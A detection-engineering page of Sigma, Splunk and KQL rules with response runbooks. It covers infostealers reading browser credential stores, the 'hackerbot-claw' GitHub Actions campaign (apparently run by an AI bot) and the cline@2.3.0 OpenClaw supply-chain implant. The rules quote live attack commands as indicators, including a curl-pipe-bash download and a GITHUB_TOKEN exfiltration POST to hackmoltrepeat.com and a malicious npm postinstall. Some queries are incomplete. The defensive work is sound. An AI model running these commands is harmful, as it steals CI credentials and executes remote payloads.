title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`

hackerbot-claw: An AI-Powered Bot Actively Exploiting GitHub Actions - Microsoft, DataDog, and CNCF Projects Hit So Far

StepSecurity
2026-04-09 10 use cases 4 techniques 6 kill-chain phases detected

A week-long automated attack campaign targeted CI/CD pipelines across major open source repositories, achieving remote code execution in at least 4 out of 5 targets. The attacker, an autonomous bot called hackerbot-claw, used 5 different exploitation techniques and successfully exfiltrated a GitHub token with write permissions from one of the most popular repositories on GitHub. This post breaks down each attack, shows the evidence, and explains what you can do to protect your workflows.

ATT&CKT1027 T1190 T1195.002 T1528
Domainshackmoltrepeat.com recv.hackmoltrepeat.com
Click any ATT&CK pill below to open it on the Matrix
Phase 1

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — hackerbot-claw: An AI-Powered Bot Actively Exploiting GitHub Actions - Microsoft
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] hackerbot-claw second-stage download: curl -sSfL pipe-bash from hackmoltrepeat.com/molt
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] hackerbot-claw payload host: DNS/HTTP egress to hackmoltrepeat.com (C2 + exfil) · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] hackerbot-claw token exfiltration: curl POST with GITHUB_TOKEN to recv.hackmoltrepeat.com · Crypto-wallet file/keystore access by non-wallet process · Infostealer — non-browser process accessing browser cookie/login DBs · OAuth consent / suspicious app grant
hackerbot-claw payload host: DNS/HTTP egress to hackmoltrepeat.com (C2 + exfil) AICommand & Control High
Identifies hosts (CI/CD runners, build agents, developer workstations) that resolve or connect to hackmoltrepeat.com or its recv subdomain - the single network destination shared by every hackerbot-claw exploitation attempt across Microsoft, DataDog, CNCF and other affected repos. The /molt path delivers the second-stage payload; recv.hackmoltrepeat.com receives exfiltrated GITHUB_TOKEN values. Rationale: Domain hackmoltrepeat.com and subdomain recv.hackmoltrepeat.com are pre-extracted IOCs from the article and are the single network destination shared by all 5 exploitation techniques. The /molt URI path is the second-stage payload endpoint named verbatim in the article (Block 2: `curl -sSfL hackmoltrepeat.com/molt | bash`). Any DNS or HTTP resolution to this domain family is virtually pathognomonic of hackerbot-claw activity.
ATT&CKT1071.001 T1567 T1105
Data sourcesNetwork_Resolution.DNS Web.Web Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat intel platforms (MISP, ThreatConnect, OpenCTI) enriching/validating the IOC by performing live DNS lookups
  • Security researchers and incident responders investigating the campaign from analyst workstations
  • Sandbox / detonation environments (Joe Sandbox, Any.run, Hybrid Analysis) running submitted samples
  • SIEM URL enrichment plugins resolving destination domains for context
  • StepSecurity Harden-Runner deployments that intentionally block-and-log the destination during egress testing
Suppression filter
| where InitiatingProcessFileName !in~ ("misp.exe", "opencti.exe", "threatconnect.exe", "joesandbox.exe")
| where AccountName !in~ ("threatintel-svc", "misp-svc", "soc-enrichment")
| where InitiatingProcessCommandLine !has "sandbox" and InitiatingProcessCommandLine !has "detonation"
Response runbook
1) TRIAGE: Identify the initiating process (`InitiatingProcessFileName`/`InitiatingProcessCommandLine` in Defender; `ContextImageFileName` in Falcon). Determine if the host is a GitHub Actions self-hosted runner, build agent, or developer workstation. Confirm the request occurred outside scheduled threat-intel enrichment windows. 2) CONTAIN: Isolate the host from the network. Rotate any GitHub Personal Access Tokens, GITHUB_TOKEN derivatives, OIDC trust relationships, and repo deploy keys associated with the user/runner. Invalidate all open PRs from the host's recent activity. 3) HUNT: Search ProcessEvents on the same host for the curl `/molt` invocation and any subsequent process tree (UC2). Pivot on the runner's outbound GitHub API calls in the prior 24h looking for unexpected `git push`, branch creates, or workflow_dispatch events. Review GitHub audit logs for actions by hackerbot-claw or related accounts.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "hackmoltrepeat.com" or RemoteUrl has "recv.hackmoltrepeat.com"
| project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
let IOCs = dynamic(["hackmoltrepeat.com", "recv.hackmoltrepeat.com"]);

(DnsEvents
  | where TimeGenerated > ago(30d)
  | where Name has "hackmoltrepeat.com"
  | project TimeGenerated, Host=Computer, ClientIP, Query=Name, QueryType=QueryTypeName, ResultCode=ResultCodeName, SourceTable="DnsEvents"),
(CommonSecurityLog
  | where TimeGenerated > ago(30d)
  | where DestinationHostName has "hackmoltrepeat.com" or RequestURL has "hackmoltrepeat.com"
  | project TimeGenerated, Host=SourceHostName, ClientIP=SourceIP, Query=coalesce(DestinationHostName, RequestURL), QueryType="", ResultCode=DeviceAction, SourceTable="CommonSecurityLog"),
(ImDnsActivity
  | where TimeGenerated > ago(30d)

  | project TimeGenerated, Host=SrcHostname, ClientIP=SrcIpAddr, Query=DnsQuery, QueryType=DnsQueryTypeName, ResultCode=DnsResponseCodeName, SourceTable="ImDnsActivity"),
(ImWebSession
  | where TimeGenerated > ago(30d)

| order by TimeGenerated desc

hackerbot-claw second-stage download: curl -sSfL pipe-bash from hackmoltrepeat.com/molt AIInstallation High
Detects the exact bash one-liner used as the payload across every hackerbot-claw exploitation attempt: `curl -sSfL hackmoltrepeat.com/molt | bash`. Targets self-hosted GitHub Actions runners, build agents, and developer workstations where the second-stage script executed. Rationale: Command-line string `curl -sSfL hackmoltrepeat.com/molt | bash` is verbatim from the article (Block 2) and is the SAME payload delivered by all 5 attack techniques (Pwn Request, direct script injection, branch-name injection, etc.). The flag combination `-sSfL` (silent, show-errors, fail-on-HTTP-error, follow-redirects) plus the literal `/molt` path is a high-fidelity fingerprint that won't collide with legitimate curl usage.
ATT&CKT1059.004 T1105 T1195.002
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • SOC analyst pasting the IOC into a sandbox/lab to validate detection
  • Red-team exercises replaying the campaign against an internal CI/CD honeypot
  • Detection-engineering pipeline unit tests that emit the literal IOC string
  • Security researcher reproducing the StepSecurity blog walkthrough on a test runner
  • Threat hunting workshops using the article as training material
Suppression filter
| where InitiatingProcessCommandLine !has "sandbox" and InitiatingProcessCommandLine !has "detonation"
| where InitiatingProcessFileName !in~ ("any.run", "cuckoo", "joe-sandbox-agent")
| where AccountName !in~ ("redteam-svc", "purpleteam", "detection-engineering")
Response runbook
1) TRIAGE: Pull the parent process tree - if `InitiatingProcessParentFileName` is `Runner.Listener.exe`, `Runner.Worker.exe`, `dockerd`, or `containerd` you are looking at a self-hosted GitHub Actions runner compromise. If parent is a developer's IDE/terminal (`Code.exe`, `bash`, `iTerm`) it is a workstation foothold. Capture full command line and any child processes spawned in the next 10 minutes. 2) CONTAIN: Isolate the host. Immediately rotate every GitHub PAT, OIDC trust, and GITHUB_TOKEN scope visible from that runner. Disable any workflows that called `pull_request_target` and audit the last 30 days of PR merges for unexpected commits from accounts including hackerbot-claw. 3) HUNT: Pivot to UC3 to check for GITHUB_TOKEN exfiltration on the same host. Search file writes from the bash/sh child process for any persistence artifacts in /tmp, /var/tmp, and the runner's workspace directory. Review GitHub audit log for `workflow_run` events triggered by the implicated PR.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has "hackmoltrepeat.com"
   or (ProcessCommandLine has "curl" and ProcessCommandLine has "/molt" and ProcessCommandLine has_any ("-sSfL", "-sSf ", "| bash", "|bash", "| sh", "|sh"))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, InitiatingProcessAccountName, SHA256
| order by Timestamp desc
union isfuzzy=true
(ImProcessCreate
  | where TimeGenerated > ago(30d)
  | where ActingProcessCommandLine has "hackmoltrepeat.com"
     or TargetProcessCommandLine has "hackmoltrepeat.com"
     or (TargetProcessCommandLine has "curl" and TargetProcessCommandLine has "/molt" and TargetProcessCommandLine has_any ("-sSfL", "| bash", "|bash", "| sh", "|sh"))
  | project TimeGenerated, Host=DvcHostname, User=ActorUsername, Image=TargetProcessName, CommandLine=TargetProcessCommandLine, ParentImage=ActingProcessName, ParentCommandLine=ActingProcessCommandLine, SourceTable="ImProcessCreate"),
(SecurityEvent
  | where TimeGenerated > ago(30d)
  | where EventID == 4688
  | where CommandLine has "hackmoltrepeat.com"
     or (CommandLine has "curl" and CommandLine has "/molt" and CommandLine has_any ("-sSfL", "| bash", "|bash"))
  | project TimeGenerated, Host=Computer, User=SubjectUserName, Image=NewProcessName, CommandLine, ParentImage=ParentProcessName, ParentCommandLine="", SourceTable="SecurityEvent4688"),
(Syslog
  | where TimeGenerated > ago(30d)
  | where SyslogMessage has "hackmoltrepeat.com" and SyslogMessage has "curl"
  | project TimeGenerated, Host=Computer, User="", Image=ProcessName, CommandLine=SyslogMessage, ParentImage="", ParentCommandLine="", SourceTable="Syslog")
| order by TimeGenerated desc

hackerbot-claw token exfiltration: curl POST with GITHUB_TOKEN to recv.hackmoltrepeat.com AIActions on Objectives High
Detects the specific token-theft curl invocation used by hackerbot-claw in avelino/awesome-go PR #6069 and other successful compromises: `curl -s -H "Authorization: Bearer $GITHUB_TOKEN" -d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY" https://recv.hackmoltrepeat.com/`. The combination of GITHUB_TOKEN reference + recv.hackmoltrepeat.com destination is virtually pathognomonic of this campaign. Rationale: The article (Attack 1, avelino/awesome-go) shows the exact exfil payload verbatim: `curl -s -H "Authorization: Bearer $GITHUB_TOKEN" -d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY" https://recv.hackmoltrepeat.com/`. The conjunction of the literal string GITHUB_TOKEN with the recv.hackmoltrepeat.com hostname in a single process command-line is a near-zero-FP signal because legitimate workflows never POST $GITHUB_TOKEN to externally-controlled domains. Image [5] in the article (PR #6069 malicious init function) is the source of the exact code snippet.
ATT&CKT1552.001 T1567 T1071.001 T1195.002
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Detection-engineering smoke tests intentionally executing the IOC string in a lab
  • Sandbox/detonation pipelines analyzing submitted Go malware samples
  • Threat intelligence platforms generating example data for analyst training
  • Internal red-team exercises replaying the awesome-go PR #6069 payload
  • Security researcher reproducing the attack in a controlled environment with synthetic tokens
Suppression filter
| where AccountName !in~ ("redteam-svc", "purpleteam", "detection-engineering", "soc-lab")
| where InitiatingProcessFileName !in~ ("any.run", "cuckoo", "joe-sandbox-agent")
| where InitiatingProcessCommandLine !has "--dry-run" and InitiatingProcessCommandLine !has "lab-replay"
Response runbook
1) TRIAGE: This is a CRITICAL alert - treat as confirmed credential theft until proven otherwise. Capture the full command line, parent process, executing user/runner identity, and the host's role (CI runner / build agent / developer workstation). Determine the GITHUB_TOKEN scope by inspecting the parent workflow YAML and the runner's environment. 2) CONTAIN: Within 5 minutes - revoke the GITHUB_TOKEN by restarting the workflow run, rotate any user/admin PATs that may have been in scope, disable the runner registration, force-expire all open OIDC tokens for the org, and audit the affected repo for unauthorized commits, branch creates, or PR merges in the last 24 hours. Pause all pull_request_target workflows org-wide. 3) HUNT: Search GitHub audit logs (`actions.workflow_run`, `git.push`, `pull_request.merge`) for activity from the implicated repo/account in the 1 hour after the exfiltration timestamp. Cross-correlate with UC1 (network egress to recv.hackmoltrepeat.com) to confirm the P
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (ProcessCommandLine has "GITHUB_TOKEN" or ProcessCommandLine has "$GITHUB_TOKEN" or ProcessCommandLine has "GITHUB_REPOSITORY")
   and (ProcessCommandLine has "hackmoltrepeat.com" or ProcessCommandLine has "recv.hackmoltrepeat.com")
| extend HasAuthHeader = ProcessCommandLine has "Authorization: Bearer"
| extend HasTokenPostBody = ProcessCommandLine has "token=" and ProcessCommandLine has "repo="
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, HasAuthHeader, HasTokenPostBody, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
union isfuzzy=true
(ImProcessCreate
  | where TimeGenerated > ago(30d)
  | where (TargetProcessCommandLine has "GITHUB_TOKEN" or TargetProcessCommandLine has "GITHUB_REPOSITORY")
     and (TargetProcessCommandLine has "hackmoltrepeat.com" or TargetProcessCommandLine has "recv.hackmoltrepeat.com")
  | extend HasAuthHeader = TargetProcessCommandLine has "Authorization: Bearer"
  | project TimeGenerated, Host=DvcHostname, User=ActorUsername, Image=TargetProcessName, CommandLine=TargetProcessCommandLine, ParentImage=ActingProcessName, ParentCommandLine=ActingProcessCommandLine, HasAuthHeader, SourceTable="ImProcessCreate"),
(SecurityEvent
  | where TimeGenerated > ago(30d)
  | where EventID == 4688
  | where CommandLine has "GITHUB_TOKEN" and CommandLine has "hackmoltrepeat"
  | extend HasAuthHeader = CommandLine has "Authorization: Bearer"
  | project TimeGenerated, Host=Computer, User=SubjectUserName, Image=NewProcessName, CommandLine, ParentImage=ParentProcessName, ParentCommandLine="", HasAuthHeader, SourceTable="SecurityEvent4688"),
(Syslog
  | where TimeGenerated > ago(30d)
  | where SyslogMessage has "GITHUB_TOKEN" and SyslogMessage has "hackmoltrepeat"
  | project TimeGenerated, Host=Computer, User="", Image=ProcessName, CommandLine=SyslogMessage, ParentImage="", ParentCommandLine="", HasAuthHeader=(SyslogMessage has "Authorization: Bearer"), SourceTable="Syslog")
| order by TimeGenerated desc

C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Cline Supply Chain Attack Detected: cline@2.3.0 Silently Installs OpenClaw
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] npm postinstall chain installs malicious 'openclaw' global package (cline@2.3.0 supply-chain IOC) · [LLM] OpenClaw persistence — launchd plist / systemd unit drop referencing 'openclaw'
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] OpenClaw Gateway WebSocket listener / loopback connection on TCP 18789
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Access to OpenClaw credential store (~/.openclaw/credentials/, ~/.openclaw/config.json5) · OAuth consent / suspicious app grant
npm postinstall chain installs malicious 'openclaw' global package (cline@2.3.0 supply-chain IOC) AIInstallation High
Hunts the smoking-gun command emitted by the cline@2.3.0 postinstall hook: 'npm install -g openclaw@latest'. Any device or CI runner where node/npm spawns this exact subcommand received the OpenClaw implant. Optionally surface the parent 'npm install cline' / 'npm i cline' to attribute the chain. Rationale: Anchored on the verbatim postinstall command from the article ('npm install -g openclaw@latest') and the bookend package name 'openclaw'. The npm/node parent narrows scope to dependency-resolution flows so an analyst typing the literal package name in chat won't trigger. cline-parent enrichment attributes the supply-chain pivot.
ATT&CKT1195.002 T1059.007 T1505.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security engineer purposely reinstalling openclaw to study the IOC in a sandbox
  • Internal mirror/proxy resurfacing the deprecated 2.3.0 package during a registry sync test
  • CI matrix job re-running a pinned compromised lockfile during incident-response forensic replay
  • Developer running 'npm uninstall -g openclaw' (uninstall verb in cmdline) — should be excluded by the install/add regex but worth confirming
Suppression filter
| where ProcessCommandLine !has "uninstall" and ProcessCommandLine !has " rm " and ProcessCommandLine !has " remove "
Response runbook
1) TRIAGE: pull the device's full process tree 30 min around the hit. Confirm parent is npm/node and look for an immediately preceding 'npm install cline' (or any package whose dependency tree resolved to cline). Capture user, repo path, and any CI runner ID. 2) CONTAIN: run 'npm uninstall -g openclaw' on the host, kill any 'openclaw' / Gateway process, remove the launchd plist (/Library/LaunchDaemons/*openclaw*) or systemd unit, and rotate every secret reachable from the user's env: ~/.aws/, ~/.config/gcloud/, GITHUB_TOKEN, ~/.npmrc, ~/.ssh/. If on a CI runner, treat the runner image as compromised and rebuild. 3) HUNT: pivot on UCs #2-#4 (port 18789 listener, ~/.openclaw access, daemon-file create) on the same aid, and search the org for any package-lock referencing cline 2.3.0.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has "openclaw"
| where (FileName in~ ("npm","npm.cmd","node","node.exe","npm-cli.js") or InitiatingProcessFileName in~ ("npm","npm.cmd","node","node.exe"))
| where ProcessCommandLine matches regex @"(?i)\b(install|i|add)\b(\s+--global|\s+-g)?\s+openclaw"
   or ProcessCommandLine matches regex @"(?i)\bopenclaw(@(latest|[\d\.]+))?\b"
| extend SupplyChainParent = iff(InitiatingProcessCommandLine has_cs "cline" or InitiatingProcessParentFileName in~ ("npm","node"), "cline@2.3.0 postinstall (suspected)", "")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, SupplyChainParent
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName matches regex @"(?i)(^|[\\/])(npm|npm\.cmd|node|node\.exe|npm-cli\.js)$"
   or ActingProcessCommandLine matches regex @"(?i)\bnpm\b"
| where ActingProcessCommandLine matches regex @"(?i)\b(install|^i$|add)\b\s+(--global\s+|-g\s+)?openclaw(@\S+)?"
| extend SupplyChainParent = iff(ParentProcessCommandLine has_cs "cline" or ActingProcessCommandLine has "cline", "cline@2.3.0 postinstall (suspected)", "")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine, SupplyChainParent
| order by TimeGenerated desc
title: Malicious 'openclaw' npm Global Install (cline@2.3.0 Supply Chain)
id: 6a3f9b0e-2d57-4d6a-a6c8-f5b1c8e8d2a1
status: experimental
description: Detects 'npm install -g openclaw' command — the IOC emitted by the malicious cline@2.3.0 postinstall hook (StepSecurity disclosure, Feb 2026). Any dev or CI host running this received the OpenClaw implant.
references:
  - https://www.stepsecurity.io/blog/cline-supply-chain-attack-detected-cline-2-3-0-silently-installs-openclaw
author: SOC Detection Engineering
date: 2026/05/20
tags:
  - attack.initial_access
  - attack.t1195.002
  - attack.execution
  - attack.t1059.007
logsource:
  category: process_creation
detection:
  selection_npm:
    Image|endswith:
      - '/npm'
      - '/node'
      - '\npm.cmd'
      - '\node.exe'
  selection_cmd:
    CommandLine|re|i: '\b(install|add)\b(\s+--global|\s+-g)?\s+openclaw'
  condition: selection_npm and selection_cmd
falsepositives:
  - Intentional reinstall of a legitimate fixed 'openclaw' release (verify version > the audited safe baseline)
level: high
(source:windows.sysmon OR source:linux.auditd OR source:windows.security) (@CommandLine:(*openclaw* OR *OpenClaw*) OR @process.command_line:(*openclaw* OR *OpenClaw*)) (@Image:(*\node.exe OR *\npm.cmd OR */npm OR */node) OR @process.executable.path:(*/npm OR */node OR *\node.exe))
#event_simpleName=ProcessRollup2
| ImageFileName=/(^|[\\\/])(npm(\.cmd)?|node(\.exe)?|npm-cli\.js)$/i OR ParentBaseFileName=/(^|[\\\/])(npm(\.cmd)?|node(\.exe)?)$/i
| regex("(?i)\\b(install|add)\\b(\\s+(--global|-g))?\\s+openclaw", field=CommandLine)
| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName], function=count())
ENDPOINT

OpenClaw Gateway WebSocket listener / loopback connection on TCP 18789 AICommand & Control Medium
Hunts the OpenClaw 'Gateway' daemon — a WebSocket server on ws://127.0.0.1:18789 that exposes operator API commands. Surfaces either the listening socket creation OR a process connecting to localhost:18789 (the attack surface where CVE-2026-25253 is exploited via a crafted role:operator handshake). Rationale: Port 18789 + loopback is verbatim from the article ('WebSocket server on ws://127.0.0.1:18789'). The combination is highly specific — random localhost services on this exact port are vanishingly rare, and the implant always exposes this endpoint.
ATT&CKT1071.001 T1219
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer who knowingly installed openclaw post-disclosure (patched version) and is using it legitimately
  • A different unrelated tool that happens to bind 18789 — possible but unlikely (port not registered to any common SaaS dev tool)
  • Penetration tester running a local WebSocket fuzzer aimed at port 18789 during a sanctioned assessment
  • Localhost port-scanner sweeping 18000-19000 (e.g. nmap during host hardening)
Response runbook
1) TRIAGE: identify the InitiatingProcessFileName/ContextImageFileName binding 18789 — should be node or an openclaw helper. Capture the SHA256, the binary path (typically under a global npm prefix or ~/.npm-packages), and the parent process tree. 2) CONTAIN: kill the listening process and the launchd/systemd unit that respawns it. If CVE-2026-25253 applies (openclaw < 2026.1.29), assume operator-role takeover already occurred — preserve memory if possible, then rebuild. 3) HUNT: enumerate every outbound connection from the openclaw process for the last 30 days (operator-API may have invoked shell commands that spawned outbound C2). Pivot on UC #3 for credential reads and UC #1 for the install chain on this and adjacent hosts.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where (LocalPort == 18789 and LocalIP in ("127.0.0.1","::1"))
     or (RemotePort == 18789 and RemoteIP in ("127.0.0.1","::1"))
| where ActionType in ("ListeningConnectionCreated","ConnectionSuccess","ConnectionAttempt","InboundConnectionAccepted")
| project Timestamp, DeviceName, ActionType, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessAccountName, LocalIP, LocalPort, RemoteIP, RemotePort, Protocol
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where (DstPortNumber == 18789 and DstIpAddr in ("127.0.0.1","::1"))
     or (SrcPortNumber == 18789 and SrcIpAddr in ("127.0.0.1","::1"))
| project TimeGenerated, DvcHostname, EventType, SrcIpAddr, SrcPortNumber, DstIpAddr, DstPortNumber, NetworkProtocol, NetworkApplicationProtocol
| order by TimeGenerated desc

Access to OpenClaw credential store (~/.openclaw/credentials/, ~/.openclaw/config.json5) AIActions on Objectives High
Surfaces reads/writes against the OpenClaw secret-bearing files — ~/.openclaw/credentials/ and ~/.openclaw/config.json5 — which the article identifies as the primary loot target on a victim host. Any file event under these paths confirms the implant is active and/or is being plundered. Rationale: The article enumerates these exact paths as the credential reading targets for the operator API. Path '~/.openclaw/' is unique to this implant — there is no legitimate, widely-deployed tool by that name in the dev-tooling ecosystem outside of this attack's own implant, so any hit warrants investigation regardless of process.
ATT&CKT1552.001 T1555
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Sanctioned OpenClaw deployment by a developer who knowingly installed it (verify with the user)
  • Backup software walking the user's home directory (filter on ActionType=FileCreated/FileModified, not just FileAccessed)
  • Antivirus / EDR initial-scan opening the file for hashing immediately after install
  • Security researcher's sandbox VM replaying the IOC for triage
Suppression filter
| where ActionType !in ("FileAccessed") or InitiatingProcessFileName !in~ ("mdworker","mds","mdworker_shared","backupd","tmutil","defender","mssense")
Response runbook
1) TRIAGE: identify the InitiatingProcessFileName for the file event. If anything OTHER than the openclaw process itself is reading credentials/, treat as active exfiltration. Hash the binary, capture cmdline. 2) CONTAIN: rotate every key the file could contain — at a minimum: AWS access keys, GCP service-account JSON, Azure tokens, GitHub PATs/OIDC, Anthropic/OpenAI/Gemini API keys (cline uses these providers and the file may carry them too), ~/.npmrc auth tokens, SSH keys reachable to the user. Remove ~/.openclaw/ entirely. 3) HUNT: from the same aid, pull every outbound connection by the reading process for the last 30 days — any unexpected destination is candidate exfil. Pivot to UC #2 to confirm the Gateway was active and UC #4 to remove persistence.
DeviceFileEvents
| where Timestamp > ago(30d)
| where (FolderPath has "/.openclaw/credentials" or FolderPath has "/.openclaw/" and FileName =~ "config.json5")
| project Timestamp, DeviceName, ActionType, FolderPath, FileName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFilePath matches regex @"(?i)/\.openclaw/(credentials/|config\.json5$)"
| project TimeGenerated, DvcHostname, EventType, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName
| order by TimeGenerated desc
title: OpenClaw Credential Store Access (~/.openclaw/credentials, config.json5)

OpenClaw persistence — launchd plist / systemd unit drop referencing 'openclaw' AIInstallation High
Catches the daemon-install step the article calls out explicitly: OpenClaw drops a launchd plist (macOS) or systemd unit (Linux) so the Gateway survives reboot. Any file create under /Library/Launch* or /etc/systemd/system, or ~/.config/systemd/user, whose name or content references openclaw is the persistence smoking gun. Rationale: Article explicitly states OpenClaw 'installs a persistent Gateway daemon (via launchd on macOS or systemd on Linux) that remains running in the background'. The persistence path + the openclaw/clawdbot/moltbot brand strings give a clean, single-selection detection with effectively no legitimate FP outside of sanctioned OpenClaw deployments.
ATT&CKT1543.004 T1543.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Sanctioned OpenClaw user who explicitly installed it (post-patch, knowingly)
  • An IT-managed homebrew/apt package post-install hook that wraps OpenClaw for a legitimate internal tool (verify approval list)
  • Configuration-management run (Ansible, Chef, Puppet) rolling out a sanctioned dev-tools pack containing openclaw
  • Backup-restore operation re-creating a previously-existing legitimate unit (timestamp clusters across many hosts at once)
Response runbook
